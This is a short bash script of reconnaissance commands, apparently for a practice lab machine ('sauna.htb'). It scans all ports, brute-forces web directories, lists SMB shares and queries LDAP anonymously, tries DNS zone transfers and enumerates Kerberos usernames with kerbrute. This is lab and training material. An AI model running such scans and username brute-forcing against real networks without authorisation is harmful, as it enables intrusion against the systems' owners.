#! /bin/bash

nmap -p- --min-rate 10000 10.10.10.175
nmap -p 53,80,88,135,139,389,445,464,593,3268,3269,5985 -sC -sV -oA scans/tcpscripts 10.10.10.175
gobuster dir -u http://10.10.10.175/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o scans/gobuster-root -t 40
smbmap -H 10.10.10.175
smbclient -N -L //10.10.10.175
ldapsearch -x -h 10.10.10.175 -s base namingcontexts
ldapsearch -x -h 10.10.10.175 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL'

# axfr — request a zone transfer (asks the DNS server to dump its entire zone file — all records — instead of a single lookup)
dig axfr @10.10.10.175 sauna.htb
dig axfr @10.10.10.175 egotistical-bank.local

# brute-focing user names
kerbrute userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.175

